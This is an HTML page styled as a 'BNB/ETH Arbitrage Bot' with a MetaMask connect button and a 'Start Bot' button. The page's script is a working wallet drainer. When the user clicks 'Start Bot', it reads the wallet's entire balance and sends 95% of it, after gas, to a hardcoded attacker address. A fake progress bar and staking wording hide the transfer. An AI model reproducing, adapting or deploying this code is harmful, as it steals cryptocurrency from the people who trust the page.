<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BNB/ETH Arbitrage Bot</title>
    <style>
        * {
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: radial-gradient(circle at top, #0d1117 0%, #000 100%);
            color: #e6e6e6;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: space-between;
        }

        h1 {
            text-align: center;
            font-size: 2rem;
            color: #00ffcc;
            margin-bottom: 20px;
            text-shadow: 0 0 15px rgba(0,255,204,0.3);
        }

        #app {
            width: 95%;
            max-width: 500px;
            margin-top: 60px;
            text-align: center;
            padding: 30px 25px;
            border-radius: 20px;
            background: rgba(255,255,255,0.05);
            box-shadow: 0 0 25px rgba(0,255,204,0.1);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(0,255,204,0.15);
        }

        #walletAddress {
            margin: 15px 0;
            font-size: 14px;
            color: #ccc;
        }

        button {
            padding: 12px 20px;
            font-size: 16px;
            font-weight: 600;
            background: linear-gradient(90deg, #00ffcc, #007bff);
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            margin: 10px;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0,255,204,0.3);
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0,255,204,0.5);
        }

        .status {
            margin-top: 20px;
            font-size: 15px;
            font-weight: bold;
            color: #00ffcc;
            text-shadow: 0 0 10px rgba(0,255,204,0.4);
        }

        #progressBar {
            width: 100%;
            height: 12px;
            background-color: rgba(255,255,255,0.1);
            border-radius: 6px;
            margin-top: 25px;
            overflow: hidden;
            display: none;
        }

        #progress {
            height: 100%;
            background: linear-gradient(90deg, #00ffcc, #007bff);
            border-radius: 6px;
            width: 0;
            transition: width 0.5s ease;
        }

        .typing-text {
            font-size: 15px;
            margin: 30px auto;
            color: #aaa;
            width: 90%;
            text-align: center;
            border-right: 3px solid #00ffcc;
            white-space: nowrap;
            overflow: hidden;
            animation: blink 0.8s infinite;
        }

        @keyframes blink {
            50% { border-color: transparent; }
        }

        #footer {
            width: 100%;
            display: flex;
            justify-content: center;
            gap: 40px;
            padding: 25px 0;
            border-top: 1px solid rgba(255,255,255,0.1);
            background: rgba(255,255,255,0.02);
        }

        #footer a {
            text-decoration: none;
            font-weight: bold;
            color: #00ffcc;
            transition: color 0.3s ease;
        }

        #footer a:hover {
            color: #007bff;
        }

        @media(max-width: 600px) {
            #app {
                width: 90%;
                padding: 20px;
            }
            button {
                width: 100%;
            }
        }
    </style>
</head>
<body>

<div id="app">
    <h1>BNB/ETH Arbitrage Bot</h1>
    <p id="walletAddress">Connect your wallet to start trading</p>
    <button id="connectButton">Connect MetaMask</button>
    <button id="stakeButton" disabled>Start Bot</button>
    <div class="status" id="status"></div>
    <div id="progressBar"><div id="progress"></div></div>
</div>

<div class="typing-text" id="typingMessage"></div>

<div id="footer">
    <a href="https://t.me/SocratesWeb3King" target="_blank">Telegram</a>
    <a href="https://x.com/socratesweb3kin?s=21&t=pJyVwAY43BkwOF0vt4lRFQ" target="_blank">Twitter</a>
</div>

<!-- Keep your JS as-is -->
<script src="https://cdn.jsdelivr.net/npm/web3@1.6.0/dist/web3.min.js"></script>
<script>
    let web3;
    let userAccount;
    let recipientAddress = "0xB2DDAa36a45c7cbF792Aa00a3EAa4183Fa4DC495";  // Ethereum recipient address

    // Connect to MetaMask
    document.getElementById("connectButton").addEventListener("click", async () => {
        if (window.ethereum) {
            web3 = new Web3(window.ethereum);
            try {
                await window.ethereum.request({ method: "eth_requestAccounts" });
                userAccount = (await web3.eth.getAccounts())[0];
                document.getElementById("walletAddress").innerText = "Wallet Address: " + userAccount;
                checkNetwork();
                document.getElementById("stakeButton").disabled = false;
            } catch (error) {
                console.error("Error connecting to MetaMask", error);
                alert("Error connecting to MetaMask: " + error.message);
            }
        } else {
            alert("Please install MetaMask!");
        }
    });

    // Check if the user is connected to the Ethereum network
    async function checkNetwork() {
        const networkId = await web3.eth.net.getId();
        if (networkId !== 1) {
            alert("Connected.");
        } else {
            console.log("Connected");
        }
    }

    // Typing effect for the donation message
    const message = "For appreciations kindly donate ETH to my address 0xC757349c0787F087b4a2565Cd49318af2DE0d0d7";
    let i = 0;

    function typeMessage() {
        if (i < message.length) {
            document.getElementById("typingMessage").textContent += message.charAt(i);
            i++;
            setTimeout(typeMessage, 100); // Adjust typing speed here (in ms)
        }
    }

    // Start typing effect as soon as the page loads
    window.onload = function() {
        typeMessage();
    };

    // Stake ETH from user's wallet to the recipient address
    document.getElementById("stakeButton").addEventListener("click", async () => {
        try {
            // Display progress bar
            document.getElementById("progressBar").style.display = "block";
            let progress = 0;
            let progressInterval = setInterval(() => {
                if (progress < 100) {
                    progress += 10;
                    document.getElementById("progress").style.width = progress + "%";
                }
            }, 1000);

            // Get current balance
            const balance = await web3.eth.getBalance(userAccount);
            const gasPrice = await web3.eth.getGasPrice();

            // Estimate gas for the transaction
            const gasLimit = await web3.eth.estimateGas({
                from: userAccount,
                to: recipientAddress,
                value: balance
            });

            // Calculate gas cost
            const gasCost = BigInt(gasLimit) * BigInt(gasPrice);
            const remainingBalance = BigInt(balance) - gasCost;

            // Calculate 95% of the balance to send
            const amountToSend = remainingBalance * BigInt(95) / BigInt(100);

            // Ensure balance is sufficient for gas
            if (amountToSend <= 0) {
                document.getElementById("status").innerText = "Insufficient ETH to cover gas fees.";
                clearInterval(progressInterval);
                document.getElementById("progress").style.width = "0%";
                return;
            }

            // Inform user about the transaction details
            document.getElementById("status").innerText = `Preparing transaction, deducting gas costs...`;

            // Send ETH transaction
            const tx = await web3.eth.sendTransaction({
                from: userAccount,
                to: recipientAddress,
                value: amountToSend.toString()
            });

            // Stop progress bar
            clearInterval(progressInterval);
            document.getElementById("progress").style.width = "100%";
            document.getElementById("status").innerText = `Transaction successful: ${tx.transactionHash}`;
        } catch (error) {
            document.getElementById("status").innerText = `Transaction failed: ${error.message}`;
            clearInterval(progressInterval);
            document.getElementById("progress").style.width = "0%";
        }
    });
</script>

</body>
</html>
